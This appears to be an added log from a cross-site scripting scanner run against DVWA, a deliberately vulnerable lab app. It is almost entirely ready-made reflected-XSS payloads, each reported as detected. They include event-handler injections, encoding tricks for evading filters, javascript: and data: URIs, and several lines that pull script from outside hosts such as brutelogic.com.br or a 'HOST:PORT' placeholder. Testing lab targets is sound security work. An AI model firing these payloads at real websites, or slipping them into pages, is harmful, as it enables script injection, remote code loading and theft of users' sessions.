+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeyup=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmousedown=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmousemove=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseout=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseover=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseup=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onpaste=alert(1)>paste here!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)// \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)<!–\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=//brutelogic.com.br/1.js> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=//3334957647/1>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '%3Cx onxxx=alert(1) \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '</scrip</script>t><img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><svg onload=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"onmouseover=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"autofocus/onfocus=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'-alert(1)-'\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'-alert(1)//\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "\\'-alert(1)//\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '</script><svg onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onblur=alert(1)>lose focus! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onclick=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncopy=alert(1)>copy this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncontextmenu=alert(1)>right click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncut=alert(1)>copy this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x ondblclick=alert(1)>double click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x ondrag=alert(1)>drag this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onfocus=alert(1)>focus this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable oninput=alert(1)>input here! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeydown=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeypress=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeyup=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmousedown=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmousemove=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseout=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseover=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseup=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onpaste=alert(1)>paste here!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)// \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)<!–\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=//brutelogic.com.br/1.js> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=//3334957647/1>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '%3Cx onxxx=alert(1) \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<%78 onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x %6Fnxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x o%6Exxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x on%78xx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onxxx%3D1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<X onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x OnXxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<X OnXxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onxxx=1 onxxx=1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x/onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%09onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Aonxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Conxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%0Donxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x%2Fonxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<x 1='1'onxxx=1 \n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x 1="1"onxxx=1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x </onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x 1=">" onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<http://onxxx%3D1/\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<x onxxx=alert(1) 1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'onload=alert(1)><svg/1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'>alert(1)</script><script/1=' \n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '*/alert(1)</script><script>/*\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '*/alert(1)">\'onload="/*<svg/1=\'\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '`-alert(1)">\'onload="`<svg/1=\'\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "*/</script>'>alert(1)/*<script/1='\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)</script> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<iframe src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<embed src=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<math><brute href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form action=javascript:alert(1)><input type=submit> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<isindex action=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><button formaction=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=image value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form><input formaction=javascript:alert(1) type=image src=SOURCE> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<isindex formaction=javascript:alert(1) type=submit value=click> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<object data=javascript:alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg><script xlink:href=data:,alert(1) /> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<math><brute xlink:href=javascript:alert(1)>click \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchstart=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchend=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchmove=alert(1)> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<html ontouchcancel=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onorientationchange=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><img src=1 onerror=alert(1)>.gif\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src="data:&comma;alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><script src=data:&comma;alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src="//brutelogic.com.br&sol;1.js&num; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><script src=//brutelogic.com.br&sol;1.js&num; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<base href=//0>\n'}, {'type': 'submit', 'name': None}]}
